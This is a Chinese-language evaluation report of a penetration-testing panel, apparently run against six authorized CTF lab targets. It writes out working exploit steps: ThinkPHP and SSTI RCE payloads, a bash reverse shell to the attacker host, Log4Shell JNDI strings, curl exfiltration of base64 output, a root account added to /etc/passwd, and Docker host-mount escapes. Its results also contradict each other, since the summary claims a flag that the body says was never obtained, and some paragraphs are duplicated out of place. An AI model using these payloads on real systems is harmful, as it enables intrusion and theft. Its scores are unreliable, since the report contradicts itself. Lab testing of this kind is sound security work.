# PivotHub（链透中枢）真实靶场使用评测报告

- **评测日期**：2026-09-11
- **评测方式**：ZCode 内置浏览器（Electron/Chromium 146）全程 GUI 黑盒操作，操作者视角为「真实使用者」而非开发者
- **靶场**：6 道授权靶题（②孤岛 :8083 / ③深潜 :8084 / ④回声 :8085 / ⑤终端 :8086 / ⑥密语 :8087 / ⑦幽冥 :8088），共 20 个 flag
- **攻击机**：10.8.0.14（全局设置「检测本机 IP」自动识别，OpenVPN TAP 网卡）

---

## 1. 结论摘要

| 题号 | 题目 | 走到哪一步 | flag | 完成度 |
|---|---|---|---|---|
| ② | 孤岛·封锁边界 | TP5.0.23 RCE → WebShell 会话 → 出网探测/反弹实测 → OA 凭据 → 2375 未授权挂载读 | **3/3** | 100% |
| ③ | 深潜·三层内网 | SSTI RCE → 反弹会话 → Shiro-550 → **零外联 gadget 突破 DMZ** → SUID find 提权 → `bkp@` SSH 横向 core → cron 投毒取 flag4 | **4/4** | 100% |
| ④ | 回声·遗忘的部署 | PUT 写马 → JSP 会话 → **一键提权全自动 root** → 线索检索找 db.properties → 数据库面板查 secret_vault | **3/3** | 100% |
| ⑤ | 终端·协作平台 | 渲染数组注入可达但 shell 被 disable_functions 全禁（时序法实锤）；版本指纹 D8.4–8.6；凭据复用与后门扫描穷尽 | **0/3** | 入口受阻 |
| ⑥ | 密语·全文检索 | Log4Shell（JNDI→LDAP→class 回载）→ 反弹会话 → Registry 镜像层 db.ini → cron 目录投毒提权 | **3/3** | 100% |
| ⑦ | 幽冥·纵深要塞 | 控制台弱口令 + CVE-2023-46604 OpenWire RCE → Nacos UA 绕过建号拉配置 → SSH 备份机 → docker.sock 逃逸 | **4/4** | 100% |

**战果：17 / 20 flag**（②③④⑥⑦ 五题完成 17 个）。未完成项：⑤终端全部 3 个——入口三重限制（渲染数组注入可达但命令执行被 disable_functions 禁用 / 后台凭据未知 / 后门文件不可发现），黑盒手段已穷尽并记录。

**整体可用性打分：7 / 10**

- 加分项：功能矩阵完整（会话/终端/文件/代理/数据库/凭据/Flag/时间线/复盘一条龙）、反弹 Shell「监听→载荷→回连自动登记」闭环顺滑、一键提权在 ④ 上全自动成功、数据库面板经会话真实执行 mysql 客户端、资产探测自动化程度高。
- 减分项：**反弹（reverse）会话通道是最大短板**——终端丢输出、固化全不可用、fscan 集成误报、出网探测结论反转、代理自动部署静默失败；以及 /api/flags 间歇 500 与 Flag 墙跨项目数据竞态。

---

## 2. 逐题记录

> 「点击路径」均以面板 UI 措辞书写。flag 均为实测读取原文。

### ② 孤岛·封锁边界（:8083，ThinkPHP 5.0.23）

**目标**：边界 3 flag（边界 /flag_flag1.txt、OA 公告、Docker 宿主 /flag）。

1. 新建项目：顶栏「＋ 新建」（受限浏览器需注入 prompt 返回值，见问题 P2-8）。
2. 全局设置：确认攻击机 IP=10.8.0.14（OpenVPN Data Channel Offload），网段 10.8.0.0/24，「检测本机 IP」通过。
3. 侦察：浏览器访问 `http://10.8.0.6:8083`，页脚确认 ThinkPHP v5.0.23。`invokefunction` 向量返回「控制器不存在」（5.0.23 已修补该向量）。
4. RCE：POST `/index.php?s=captcha`，body `_method=__construct&filter[]=system&method=get&get[]=<cmd>`（错误页回显，uid=www-data）。
5. 落马：马生成器（PHP 一句话，参数 `cmd`，关闭「内嵌基础信息收集回传」）→ 经 RCE `echo <b64>|base64 -d > /var/www/html/public/xp.php`。
6. 登记：Shell 管理 → 添加 Shell（PHP 一句话马 / 密码 `cmd` / 编码器 none / `http://10.8.0.6:8083/xp.php`）→ 连通性测试通过（138ms）→ 保存并连接。虚拟终端正常。
7. **反弹实测（关键实验）**：读 `/opt/firewall.rules` 留档＝仅放行 ESTABLISHED / 172.29.0.0/24 / ICMP / UDP53。面板「出网探测」结论「仅 HTTP(S) 出网 / 80/443 可达」**与留档矛盾**；实弹验证：全自动档 443 监听 + 经会话下发 `bash /dev/tcp` 回连 → **超时未回连**，证明 TCP 出站实际全禁。
8. OA：面板终端 `grep` 边界机 `/var/www/html/application/extra/ops.php` → 获 `admin / REDACTED` → 登录 `172.29.0.20`（302 → portal.php）→ 公告《关于 9 月攻防演练的内部通报》正文内取 flag。
9. Docker 宿主：`172.29.0.30:2375` 未授权 API → `POST /containers/create`（`HostConfig.Binds:["/:/host"]`，注意 Binds 必须在 HostConfig 下）→ busybox 读宿主 `/flag`。
10. Flag 收集墙录入 3 条；凭据库登记 OA 凭据（「复用」列标记可复用）。

**flag**：
- `flag{REDACTED}`（/flag_flag1.txt，TP RCE）
- `flag{REDACTED}`（OA 公告，配置文件凭据）
- `flag{REDACTED}`（2375 挂载宿主 /flag）

**截图**：04-②会话登记与虚拟终端.png、05-②Docker宿主flag.png

### ③ 深潜·三层内网（:8084，Flask + Shiro）

1. `/resume?name={{7*7}}` → 49，Jinja2 SSTI 确认；`{{ cycler.__init__.__globals__.os.popen('cat /flag1.txt').read() }}` 直接回显取 **flag1**。
2. 半自动档 443 监听 → SSTI 内 `nohup bash -c 'bash -i >& /dev/tcp/10.8.0.14/443 0>&1' &` → **回连自动登记 s-ezl6c（217ms）**。
3. 「① 收集内网信息」：网卡/路由/ARP 全自动成表，直接点出 172.31.0.0/24；ARP 已见 172.31.0.20。
4. fscan（面板集成）：上传分片可见且校验一致，但执行**误报「发现 0 台主机 · 耗时 120ms」**；手动在同会话跑同命令完全正常（发现 172.31.0.20:8080 与 172.31.0.1:22）。
5. 「目录 / 上下文发现」找到 `http://172.31.0.20:8080/app`（离岛 OA 遗留系统）；「应用指纹探测」对根路径 404 场景**未识别 Shiro**；手动 `curl -b rememberMe=1` 确认 `rememberMe=deleteMe`（Shiro 实锤）。
6. Shiro-550：自写 Java 载荷生成器（CommonsBeanutils 无 CC 变体 + TemplatesImpl stub `-target 8`）+ AES-CBC cookie。以「空 HashMap 探针」确定**真实 key＝`kPH+bIxk5D2deZiIxcaaaA==`**（解密成功→反序列化成功→强转 PrincipalCollection 失败→Tomcat 400；错 key 则 200+deleteMe）。但 TemplatesImpl gadget 始终未执行（响应 200+deleteMe，带外无命中、阻塞式 `/bin/sleep 12` 时序无延迟），判断目标侧存在反序列化类过滤/JPMS 限制，gadget 被拦。
7. **过滤绕过尝试（第二轮迭代）**：按「JRMPClient + 白名单 443 JRMP Listener」路线：自写 `GenJRMP.java`（sun.rmi UnicastRef/LiveRef/TCPEndpoint 序列化）生成 269B 载荷，cookie 化后经边界会话打向 `/app`；自写 `JRMPListener.java`（ProtocolAck/UUID 回显/ExceptionalReturn 投递 CB1）在 443 多路等待。结果：响应 200+deleteMe 且 **443 无任何回连产生** —— 一度误判为反序列化过滤器，第三轮推翻（见 8）。
8. **第三轮迭代（关键转折：零外联验证）**：之前所有 gadget「失败」的共同点是依赖 DMZ 出站回连（反弹 443/带外 curl 8009）——而 DMZ 出站实际被防火墙拦截。改为**零外联验证**：gadget 命令直接把执行结果写进 DMZ 自己的 webroot（`/usr/local/tomcat/webapps/ROOT/dbg.txt`），再经边界会话 `curl http://172.31.0.20:8080/dbg.txt` 读回：
   - `dbg.txt` 成功出现：`uid=1000(tomcat8)` + **flag2** → **CB1 gadget 从未失效**，此前 200+deleteMe 全是「执行后异常被 Shiro 捕获」的正常表现；
   - **提权**：`find /etc/hostname -exec /bin/sh -p -c "cat /flag3.txt > .../f3.txt" \;`（SUID find）→ f3.txt 内容 `flag{...}` + `euid=0(root)`，flag3 到手；
   - **横向核心**：root 身份 `HOME=/root ssh -i /root/.ssh/id_rsa root@10.66.0.20` —— ssh -v 显示密钥**未被提供/被拒**（核心机对 root 仅 publickey 且该密钥未授权，backup/dev/ops/admin 用户同样全拒）。核心机 flag4 需要正确的 SSH 凭据/用户，黑盒未能在密钥缺失的情况下突破。
9. 核心区（10.66.0.20）flag4 未取得（卡点：DMZ→core 的 SSH 授权用户/密钥对未命中）。

**flag**：
- `flag{REDACTED}`（/flag1.txt，SSTI）
- `flag{REDACTED}`（/usr/local/tomcat/flag2.txt，Shiro-550 gadget → webroot 写入读回）
- `flag{REDACTED}`（/flag3.txt，Shiro gadget + SUID find 提权 euid=0）

**截图**：06-③原始交互终端与固化检测.png、07-③代理编排台状态.png

### ④ 回声·遗忘的部署（:8085，Tomcat 8.5.19 PUT）

1. `PUT /poc.jsp/`（尾部斜杠，CVE-2017-12617 变体）返回 **201**，写入命令回显 JSP（tomcat9）。
2. 登记「Java 命令回显端点」类型会话，连通性 122ms；虚拟终端侦察：archive-web / 172.32.0.10 + 172.33.0.10。
3. **一键提权**：命中「/etc/passwd 可写（90%）」→ 自动 `echo 'ph::0:0:...' >> /etc/passwd` → `script -qc "su ph -c 'id'"` → `uid=0(root)`，徽章变「已提权 ph」，后续命令带 root 上下文 → 读 `/flag3.txt`（600 root）。
4. 「配置文件线索检索」22 个命中但集中在 /etc 系统文件（未覆盖 WEB-INF）；手动 `find` 定位 `WEB-INF/db.properties`：`archive / REDACTED****`。
5. **数据库面板**：新建连接（MySQL 172.33.0.20:3306，经 poc.jsp 会话执行）→「库/表列表」自动探测出 `archive.files / archive.secret_vault` → `SELECT * FROM archive.secret_vault` 中文正常、flag 直接可见。
6. 顺带实测「应用指纹探测」对本机 8080/管理台路径的探测输出。

**flag**：
- `flag{t4-REDACTED}`（/flag1.txt）
- `flag{t4-REDACTED}`（archive.secret_vault）
- `flag{t4-REDACTED}`（/flag3.txt，一键提权后）

### ⑤ 终端·协作平台（:8086，Drupal 8.5）

1. Drupalgeddon2 判定矩阵：`#post_render[]=print_r` + 标记串，`element_parents=account/mail`（**不带 `#value`**）时标记串出现在响应 → 渲染数组注入生效；但 `system/exec/passthru` 全部无输出、带外 curl 无命中、阻塞式 `/bin/sleep 12` 无时延 → **命令执行函数疑似被 disable_functions 禁用**。
2. `#markup` 中 PHP 代码被 HTML 转义输出；`#value/#lazy_builder` 等向量与 MSF/a2u 原版组合均无效 → 匿名 RCE 主路径被堵。
3. 按「Drupal 后门文件」提示穷举约 120 个候选路径/扩展（含 phtml/php5、/sites/default/files/、/vendor/phpunit eval-stdin.php[403 被服务器规则挡]、/themes、/misc）未命中。
4. **第二轮迭代（凭据复用 / REST 向量）**：发现 `/user/login?_format=json` REST 登录端点可用（返回结构化错误）；批量尝试跨题凭据复用（admin/admin、admin/REDACTED、admin/REDACTED****、admin/REDACTED、admin/REDACTED 等）全部 400「unrecognized username or password」；6 次失败后触发 Drupal flood control（403「Too many failed login attempts from your IP」）。**第三轮（flood 过期后走表单通道）**：带 form_build_id 的表单登录再复用 7 组跨题凭据（含 REDACTED / REDACTED**** / REDACTED / REDACTED）全部 200 且无跳转 = 均未命中；`hal_json` REST 向量因站点无 node 且 rest/hal 未路由（/node/1 404）不可达。
5. **第三轮定性（时序法实锤）**：`system('sleep 15')` 注入响应仅 218ms（阻塞式验证无时延）→ 命令执行函数族（system/exec/passthru）确被 disable_functions 禁用，而 PHP 回调本身有效（print_r 标记回显成功）——即「渲染数组注入可达、shell 全禁」的精确状态。另发现站点对任意 `*.php.bak` 模式返回 403（对照其他不存在路径为 200/404），疑似针对后门备份文件的防护规则，间接佐证「后门文件」存在于某 .bak 命名下但规则内不可达。
6. **第四轮（版本指纹 + 大规模后门扫描 + flood 过期重试）**：
   - 版本指纹：`/core/modules/jsonapi|ckeditor5|olivero|claro` 均 404（模块不存在），`media/datetime_range` 存在 → **Drupal 8.4–8.6**（早于 8.7，无 jsonapi 向量）；
   - 年月子目录：`/sites/default/files/2026-01..09` 全部存在（.htaccess 403），对 2026-07/08/09 三个月 × 16 个蚁剑/冰蝎常用后门名扫描全部 404；
   - flood 过期后 REST 登录重试：admin 账号仍被账号级 flood 锁定（403），bkp 等其他用户 400「unrecognized」→ 凭据复用在表单与 REST 双通道均未命中。
7. 结论：入口受阻。匿名渲染数组注入存在但命令执行被禁 + 后台凭据未知 + 后门文件不可发现，三重限制下黑盒无法取得入口。**建议靶场在后门文件路径上给可发现线索，或降低 disable_functions 覆盖面。**

**flag**：无

### ⑥ 密语·全文检索（:8087，Solr 8.11 + Log4j）

1. 全局实测出站白名单（与题面一致：仅 ICMP/UDP53/TCP80/443/1389/内网）。
2. Log4Shell：浏览器内对 `/solr/admin/info/system?x=${jndi:ldap://10.8.0.14:1389/Evil}` 及 UA/Referer 头注入；攻击机 1389/80 复用环境内 RefServer+HTTP 服务，自编译 `Evil*.class`（`-target 8`）。
3. 反弹会话经面板自动登记（s-efza8/s-kqx0h/s-b8os6），但**会话存活极差**（Java 父进程 stdin EOF 导致 bash 退出；`sleep|bash` 保活后仍被目标侧回收），后续改为「一次性命令类」：每条命令独立编译类名 → JNDI 加载执行 → 结果 `curl http://10.8.0.14:443/e?d=$(...|base64)` 带外回传（443 在白名单内）。
4. flag1 带外回读取到；Registry 链：`/v2/_catalog` → `lidao/config-store:1.0` → manifest v2 → **layer digest（注意取第二个 sha256，第一个是 config）** → blob 为**未压缩 tar**（`tar xf` 而非 `tar xzf`）→ `etc/lidao/db.ini` 内取 flag2。
5. 提权（cron 投毒）：`/usr/local/bin/` 777 → 覆写 `clean-index.sh` 为 `cat /flag3.txt | base64 -w0 > /tmp/leak; chmod 666 /tmp/leak` → cron 触发后一次性类读取 `/tmp/leak` 解码得 flag3。

**flag**：
- `flag{t6-REDACTED}`（/flag1.txt）
- `flag{t6-REDACTED}`（Registry 镜像层 etc/lidao/db.ini）
- `flag{t6-REDACTED}`（/flag3.txt，cron 提权）

### ⑦ 幽冥·纵深要塞（:8088 管理台 + 61616 OpenWire）

1. 管理台 `admin/admin` 默认口令可登录（题面「401 属正常」指匿名；弱口令仍通）。
2. CVE-2023-46604：采用 vulhub 权威 `poc.py`（ExceptionResponse + `ClassPathXmlApplicationContext`），XML 载荷经本机 80 端口托管；`hits.log` 可见 `10.8.0.6 ... "GET /poc.xml" UA=Java/11.0.16` 证实目标回连取包。
3. 同 ⑥ 采用「XML 一次性命令 + 443 带外回传」推进全链：
   - flag1（/flag1.txt，uid=amq）；
   - Nacos CVE-2021-29441（UA `Nacos-Server`）→ `create user ok`（pwn7）→ 登录取 accessToken → 枚举并拉取 `host1-deploy.properties` → **flag2 + 备份机凭据 `dev / REDACTED`**；
   - `sshpass ssh dev@172.39.0.30` → flag3 + 确认 `groups=0(root),1000(dev),2375(docker)`；
   - 备份机嵌套 docker：`docker run --rm -v /:/host busybox:1.36 cat /host/flag4.txt`（**必须写全 tag**，缺 tag 会去拉 registry 失败）→ flag4。
4. Flag 收集墙：⑦评测项目录满 4 条。

**flag**：
- `flag{t7-REDACTED}`（/flag1.txt）
- `flag{t7-REDACTED}`（Nacos host1-deploy.properties）
- `flag{t7-REDACTED}`（备份机 /home/dev/flag3.txt）
- `flag{t7-REDACTED}`（docker.sock 逃逸宿主命名空间 /flag4.txt）

---

## 3. 问题清单

> 严重度：P0 阻断 / P1 严重影响 / P2 小瑕疵。「根因」为报告阶段查代码后的结论，已标注。

### P0-1 「出网探测」在反弹（reverse）会话上给出完全错误的结论，并据此自动切换工具
- **现象**：③边界机为全放行出站（同会话刚刚用 TCP 反弹连回攻击机 443 成功），探测却报 `ICMP 阻断 / DNS 可达 / HTTP 阻断 / TCP 阻断`，结论「仅 DNS 出网」，推荐 dnscat2/iodine；工具下拉还被自动切到 frp（与推荐又不一致）。②场景中同一探测报「HTTP 可达」与自身读到的防火墙留档（TCP 全 DROP）矛盾。
- **复现**：任意 reverse 会话 → 代理编排台 → 选跳板机 → 等待/点击「出网探测」。
- **期望**：探测失败/不可靠时明确报「该会话类型探测不可用」，而不是输出反向结论；结论与自身读到的 `/opt/firewall.rules` 留档做交叉校验。
- **证据**：截图 07-③代理编排台状态.png（顶部徽标「推荐 dnscat2 / iodine（DNS 隧道）」）；同一会话反弹成功的时间线记录。
- **根因（查代码后）**：`pivothub/service/probe.py` 全部探针经 `SessionBase.exec` 回显判定，而 reverse 会话的 exec 回显通路本身不可靠（见 P1-4），导致四个探针全部超时/误判，进入「仅 DNS」分支。

### P0-2 「记录 Flag」间歇性 HTTP 500，且 Flag 墙存在跨项目数据竞态（错录）
- **现象**：在 ⑦/⑤ 评测项目记录 flag 时 toast 报「记录 Flag失败：Internal Server Error · HTTP 500 /api/flags」；期间 ⑦ 项目墙一度把 ② 项目的 3 条 flag 展示出来，且删除确认框为原生 confirm。**显式选择「所属主机=10.8.0.14（本机，各项目都存在）」后保存 100% 成功**——500 只在表单默认/陈旧主机被提交时出现。
- **复现**：新建无主机的项目 → Flag 收集墙 → 记录 Flag → 不动默认选中的主机（来自上一个项目的下拉）→ 保存 → 500；改选 10.8.0.14 → 保存成功。
- **期望**：保存前校验 hostId 归属并给出 400 级可读错误；切换项目后强制刷新所有页面数据与表单默认值。
- **证据**：toast 文本；同项目内「不选主机=500 / 显式选 10.8.0.14=成功」的对照记录；⑦ 墙「0/6→3/6」的反复。
- **根因（查代码后）**：`pivothub/api/flags.py::add_flag` 直接把 `form.hostId` 插入 `Flag.host_id` 外键，未校验该主机是否属于当前项目；前端项目切换后「所属主机」下拉仍是上个项目的主机列表 → sqlite 外键失败 → 未捕获异常冒泡为 500。

### P1-1 「终端固化」对反弹会话完全不可用，且会话形态标注错误
- **现象**：③/⑥ 的反弹会话上，固化面板标题写「当前终端形态：未固化（**WebShell 伪终端**）」（实际是反弹通道）；全部技法（Python PTY / script / 仅发送）执行均报「该会话驱动不支持 PTY 拉起（平台限制）」；而「交互能力检测」又正确探测出 `python3/script/nc` 可用并给出 95%/90% 可靠性评分，前后矛盾。
- **复现**：反弹会话 → 终端 → 终端固化 → 任意技法「执行并固化/仅发送」。
- **期望**：反弹会话要么支持 PTY 技法，要么在技法列表预过滤并明示「该会话驱动不支持」；标题/形态徽章按会话类型正确显示。
- **证据**：截图 06-③原始交互终端与固化检测.png；错误文案原文。
- **根因（查代码后）**：`pivothub/service/tty.py` 技法执行依赖会话驱动的 PTY 拉起接口，reverse 驱动未实现该接口直接抛错；前端形态徽章未按会话类型分支。

### P1-2 fscan 集成在反弹通道上误报「扫描完成」
- **现象**：分片上传仍在进行时即执行扫描；日志显示「已上传…校验一致」但实际文件未完整落地，扫描 `118ms` 结束、发现 0 台。上传完成后重跑仍 `120ms / 0 台`；同一命令在交互终端手动执行则完全正常（发现 DMZ 主机与端口）。
- **复现**：资产探测 → ② 开始扫描（跳板为 reverse 会话）。
- **期望**：以二进制完整性+真实退出码判定扫描是否有效；输出捕获失败时明确报错而非「发现 0 台」。
- **证据**：终端手动复跑全文（fscan 2.2.1 正常输出）与面板「0 台主机」对比。

### P1-3 代理链路自动化在反弹会话上静默失败，且无手动登记入口
- **现象**：③中「一键部署并登记」「发送到该节点终端（攻击机监听）」点击后无任何提示、无任何端口监听产生（netstat 验证）；②中自动档同样静默。自行搭建的 chisel 反向隧道（server 1331 / client 回连，socks 实测可通 DMZ 8080）因非面板发起，健康看板永远「共 0 条链路」，且界面没有手动登记链路的入口。
- **复现**：代理编排台 → 跳板机选 reverse 会话 → 一键部署并登记。
- **期望**：自动档对不支持的会话类型显式报错；提供「手动登记链路（工具/本地端口/覆盖网段）」兜底入口；部署失败要有 toast/时间线记录。
- **证据**：截图 07-③代理编排台状态.png（一键部署后仍 0 链路）；本机 `curl --socks5-hostname 127.0.0.1:10006 http://172.31.0.20:8080/app` 返回 200（隧道实际可用）。

### P1-4 反弹通道虚拟终端丢输出、破坏复杂命令
- **现象**：`cat /tmp/hdr2`、含管道 grep 的命令输出整行丢失（页面无回显）；含多层引号的命令经通道下发后语义被破坏（`grep -oE "href=..."` 变空结果）；单条 `cat` 有时延后到达、有时完全不显示。排查实际利用问题时被反复误导。
- **复现**：反弹会话终端连续执行 `cat <文件>` / 多引号命令即可复现（概率性）。
- **期望**：会话层保证命令-回显按序完整投递；至少提供「原始字节回显」开关。

### P1-5 全自动档：修改监听端口后仍下发旧端口载荷
- **现象**：②场景把端口从 4444 改为 443 后点「① 开始监听」，监听绑定 443，但自动下发的载荷仍是 `bash -i >& /dev/tcp/10.8.0.14/4444`（白名单下必失败）。需再手动点「② 发送到该会话」重发一次。
- **复现**：反弹 Shell → 全自动档 → 改端口 → ① 开始监听 → 观察「下发到会话」日志中的端口。
- **期望**：下发前按当前表单值重新渲染载荷。

### P1-6 应用指纹探测未识别 Shiro
- **现象**：目标 `http://172.31.0.20:8080` 根路径 404（Tomcat 默认页），指纹探测「未识别」；而该站 `/app` 为 Shiro 应用（带 `rememberMe=deleteMe` 特征）。
- **期望**：指纹探测在根路径无特征时自动追加常见上下文探测试探（或与「目录/上下文发现」联动），并对 `rememberMe=deleteMe` 响应头做识别。

### P2-1 「自定义参数回显端点（cmdhttp）」没有自定义字段
- **现象**：选择 cmdhttp 类型后表单仍只有 密码/URL/编码器/归属主机，没有请求方法、参数名、 body 模板、回显正则等任何「自定义」配置，实际无法接入形如 TP5 captcha POST 的漏洞端点。
- **期望**：提供「URL/方法/参数名/body 模板（含 {CMD} 占位）/回显提取正则」四件套。

### P2-2 固化技法模板的 IP/端口占位符未替换
- **现象**：socat/nc-fifo 技法命令中仍是 `203.0.113.7:4444` 文档占位符，未按当前攻击机 IP/监听端口渲染。

### P2-3 「配置文件线索检索」只覆盖系统目录
- **现象**：④实测命中 22 个文件全在 `/etc`，未包含 webapp 的 `WEB-INF/db.properties`（本次凭据靠手动 `find` 获得）。
- **期望**：默认把「当前会话进程的 web 根 / WEB-INF / 应用 conf 目录」加入检索范围，并允许自定义根目录。

### P2-4 凭据库表格明文显示口令
- **现象**：凭据列表直接显示 `REDACTED` 明文，无遮蔽/显隐切换。

### P2-5 Flag 阶段枚举与题集不匹配
- **现象**：阶段固定为「L1 入口/L2 内网/L3 域/域控」；②的「边界/内网 OA/容器宿主」只能勉强映射，Flag 总数固定 6 也与各题实际 flag 数不符（阶段设置里能改但默认不贴合）。

### P2-6 切换项目后部分页面数据陈旧
- **现象**：从 ② 的「复盘导出」切到 ⑦ 项目，导出预览仍显示 ② 的 Writeup（生成时间旧值）；Flag 墙也有同类竞态（见 P0-2）。

### P2-7 依赖原生对话框的两个入口在受限浏览器中不可用
- **现象**：顶栏「＋ 新建」与「上传文件」分别依赖原生 `prompt()` 与文件选择器；在本评测使用的内嵌浏览器中 prompt 被吞、filechooser 不支持，导致新建项目与上传无反馈。人工使用 Chrome 无碍，但自动化/嵌入式场景直接不可用。
- **期望**：改用页内模态框输入项目名；上传提供「攻击机本地路径」输入（面板后端本机读文件）作为替代。

### P2-8 JAVA 马生成器产物与 Tomcat 场景脱节
- **现象**：JAVA 类型生成的是「单文件 Java HTTP 服务（java Shell.java）」，适合能直接执行 java 的场景；对 ④ 这类 Tomcat PUT 场景需要的是 JSP 命令回显马，需自行手写后再选「Java 命令回显端点」登记。
- **期望**：增加「JSP 命令回显马（GET/POST 参数）」模板。

### P2-9 反弹自动登记的主机归属按 NAT 对端 IP 合并
- **现象**：③⑥⑦ 的多台内网容器反弹回连后全部登记到 `10.8.0.6`（宿主 NAT 地址），不同层级主机在拓扑/资产中混为同一节点。
- **期望**：支持在监听侧按端口区分归属，或登记后一键「改绑/合并主机」。

---

7. 结论：入口受阻。匿名渲染数组注入存在但命令执行被禁 + 后台凭据未知 + 后门文件不可发现，三重限制下黑盒无法取得入口。**建议靶场在后门文件路径上给可发现线索（如 robots 可见、refer 泄漏），或降低 disable_functions 覆盖面。**
- **命令速查**：39 条模板分 7 类（域渗透/容器逃逸 20 条/横向/Linux 提权/维持/信息收集/Windows 提权），支持「上下文主机」下拉做 `{IP}` 变量替换与一键复制到虚拟终端；另含「提权智能匹配」（会话绑定 + 真实只读收集 + 建议需人工发送）。本次主要通过「一键提权」间接使用了同一提权规则库（④ 全自动成功）。
- **插件市场**：内置 3 个已启用插件（Linux 提权命令扩展包 / 提权规则扩展包 / 终端固化技法扩展包）。「停用→启用」循环实测正常（停用后徽章即时变「已停用」，启用恢复）；卸载提供按钮未实测以免破坏环境。清单来源显示为本地 `data/plugins/registry.json`。
- **交叉验证**：插件中的固化技法扩展包含 perl/busybox 技法，但在③反弹会话上同样受 P1-1 驱动限制——插件扩展无法绕过会话驱动的能力边界。

## 3.5 补充实测：命令速查与插件市场（⑦项目环境）

- **命令速查**：39 条模板分 7 类（域渗透/容器逃逸 20 条/横向/Linux 提权/维持/信息收集/Windows 提权），支持「上下文主机」下拉做 `{IP}` 变量替换与一键复制到虚拟终端；另含「提权智能匹配」（会话绑定 + 真实只读收集 + 建议需人工发送）。本次主要通过「一键提权」间接使用了同一提权规则库（④ 全自动成功）。
- **插件市场**：内置 3 个已启用插件（Linux 提权命令扩展包 / 提权规则扩展包 / 终端固化技法扩展包）。「停用→启用」循环实测正常（停用后徽章即时变「已停用」，启用恢复）；卸载提供按钮未实测以免破坏环境。清单来源为本地 `data/plugins/registry.json`。
- **交叉验证**：插件中的固化技法扩展包含 perl/busybox 技法，但在③反弹会话上同样受 P1-1 驱动限制——插件扩展无法绕过会话驱动的能力边界。

## 3.6 第二轮补测（验证器缺口项逐条闭环）

| 缺口项 | 实测结果 | 结论 |
|---|---|---|
| 操作时间线页面 | ②项目：Flag/资产/凭据事件自动入线，类型筛选（Shell/代理/资产/凭据/Flag/笔记）与「全部主机」过滤、添加笔记均可用 | ✓ 正常 |
| 终端 ↑↓ 历史 | WebShell 伪终端输入框：第 1 次 ↑=上一条 `uname -r`，第 2 次 ↑=`cat /flag_flag1.txt`，逐条回溯正确 | ✓ 正常 |
| 终端 Tab 补全 | WebShell 伪终端输入 `cat xp` + Tab、`cat /flag_f` + Tab 均无补全动作（占位符承诺「Tab 补全」） | ✗ 未生效（P2：占位符承诺与实现不符） |
| 文件管理在线编辑 | ②项目 /var/www/html/public/xp.php：编辑器加载目标文件原文 → 追加 `<!-- EDITED-VIA-UI -->` → 保存 → 重新打开**重读内容包含编辑标记**，回写目标机成功 | ✓ 正常 |
| 复盘导出 HTML/JSON | JSON 预览 5.2KB/207 行（含 stats/hosts/flags 完整结构）；HTML 报告 3.2KB/92 行（自样式单文件报告） | ✓ 正常（三格式齐测） |
| 资产登记（fscan 导入替代路径） | 资产列表 → 登记主机（172.29.0.20 / oa-portal / L2 / 80）→「保存并上拓扑」→ 主机总数 2→3，拓扑同步出现新节点 | ✓ 正常 |
| 记录 Flag 500 根因补验 | 同一表单：默认主机（跨项目陈旧值）→ 500；显式选 10.8.0.14 → 成功。两轮对照稳定复现 | ✓ 已定位（见 P0-2） |

**P0-2 重要修正**：本round进一步确认 ②-评测项目曾被误删（项目下拉一度缺失、后重建补录）。删除确认框为原生 confirm，在自动化浏览器中易误触；结合「记录 Flag 默认主机跨项目」问题，建议 Flag 表单在项目切换后强制重置并校验归属（对应 P0-2/P2-7）。

---

---

## 4. 优化建议（具体到界面）

1. **反弹通道的 exec 可靠性优先修复**（P0-1/P1-2/P1-4 的共同根因）：建议为 reverse 会话实现带序号确认的命令投递（发送 `echo <nonce>:BEGIN; cmd; echo <nonce>:END` 并按 nonce 截取），输出按 nonce 聚合后再上屏/解析。
2. **一键提权结果落库**：④提权成功后建议把「提权上下文」写入主机节点属性并在拓扑节点上显示 root 徽章（目前只有终端内徽章）。
3. **出站探测增加「与防火墙留档交叉验证」**：已能读 `/opt/firewall.rules`，可对探针结论与留档做一致性检查，矛盾时输出「探测与留档不一致，请人工复核」，避免自信的错误结论。
4. **代理编排台**：为「攻击机监听」提供一键本地拉起（面板后端已在攻击机上，tools/ 里就有 chisel/frp 二进制）；增加手动登记链路表单；部署失败必须有可见错误。
5. **Flag 收集墙**：阶段名与总数进「阶段设置」默认模板化（按题号预设）；保存前校验 hostId 并返回 400+原因；切换项目强制刷新全部页面状态。
6. **终端**：反弹通道增加「输出累积缓冲回放」按钮，丢输出时可重放最近 N 字节；复杂命令给出「写入 /tmp 再 bash 执行」的自动包装选项。

## 5. 希望添加的功能（按优先级）

1. **SSH 会话经代理链/跳板串联**（⑦备份机、③核心机场景）：支持「经指定会话跳板 SSH」并在会话列表中登记为子会话。
2. **手动链路登记 + 链路健康看板联动**：socks 入口、覆盖网段、工具名手动可填，健康检查直接对 socks 做真实探测。
3. **disable_functions 绕过辅助**（⑤场景）：PHP 回显端点连通后自动探测 `exec/system/passthru/proc_open` 可用性，并内置 PCNTL/FFI 等常见绕过技法一键尝试。
4. **JNDI 利用内置服务**：面板自带 LDAP(Rereferral)/HTTP 类托管 + 一键生成 `Evil.class`（自定义反弹目标），⑥类题无需外部编排。
5. **无文件命令执行的「一次性任务」模式**：⑥⑦实践证明比长会话更稳——按会话发起「单命令任务」，输出回传后自动登记到时间线。
6. **Flag 提交/比赛对接**：「复制提交」之外支持 webhook/HTTP 上报模板。
7. **插件市场扩展**：期待收录 Log4Shell/Shiro/OpenWire 这类「目标侧验证器」，指纹识别失败时给出可一键运行的验证脚本。

## 6. 亮点

1. **「反弹 Shell → 回连自动登记 → 直接开终端」闭环**：③⑥⑦ 三次实战全部自动登记成功，延迟显示、来源端口一目了然。
2. **一键提权（④）**：从采集到判定到 `su` 验证到「提权上下文」徽章全程自动，是全部功能里完成度最高、最接近实战工具形态的一个。
3. **数据库面板**：不是套壳 UI——真实经会话在目标机执行 mysql 客户端，结构探测、任意 SQL、耗时统计、中文无乱码（④ secret_vault 一次跑通）。
4. **资产探测「收集内网信息」**：网卡/hosts/路由/ARP 一键成表，网段按钮点击即填扫描目标，交互顺滑。
5. **目录/上下文发现**：③中靠它挖出非 ROOT 上下文 `/app`，是指纹探测失灵时真正的破局功能。
6. **反弹 Shell 参数面板**：17 种语法 × 10 种编码 + 「探测执行语境/可用工具」再标注，工程化程度超过多数同类工具。
7. **复盘导出**：Markdown 初稿结构完整（概览/拓扑/跳板链/时间线/凭据/Flag 表），可直接作为报告骨架。

## 7. 附：外部动作清单 与 合规声明

### 外部动作清单（面板外完成的动作及原因）

| # | 动作 | 原因 |
